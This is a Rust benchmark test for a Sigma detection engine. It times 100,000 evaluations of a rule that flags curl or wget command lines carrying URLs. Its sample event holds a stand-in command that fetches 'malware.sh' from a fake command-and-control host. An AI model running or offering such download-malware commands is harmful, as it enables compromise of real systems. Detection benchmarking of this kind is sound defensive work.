use std::collections::HashMap;
use std::time::Instant;
use spectre_rules::{SigmaRule, SigmaEngine};

#[test]
fn bench_100k_evaluations() {
    let yaml = r#"
title: "Benchmark Complex Sigma Rule"
id: "bench-rule-1"
detection:
  sel_a:
    CommandLine|contains:
      - "curl"
      - "wget"
  sel_b:
    CommandLine|contains:
      - "http://"
      - "https://"
  filter_user:
    User: "root"
  condition: "(sel_a and sel_b) and not filter_user"
"#;
    let rule: SigmaRule = serde_yaml::from_str(yaml).unwrap();
    let engine = SigmaEngine::parse(&rule).unwrap();

    let mut event = HashMap::new();
    event.insert("CommandLine".to_string(), "curl http://evil-c2.com/malware.sh".to_string());
    event.insert("User".to_string(), "www-data".to_string());

    let iters = 100_000;
    let start = Instant::now();
    for _ in 0..iters {
        let _ = engine.evaluate(&event);
    }
    let elapsed = start.elapsed();
    let secs = elapsed.as_secs_f64();
    println!("\n⚡ [V2 RUST BENCHMARK] 100,000 AST evaluations: {:.4}s ({:.0} evals/sec, {:.2} µs/eval)",
        secs, iters as f64 / secs, elapsed.as_micros() as f64 / iters as f64
    );
}
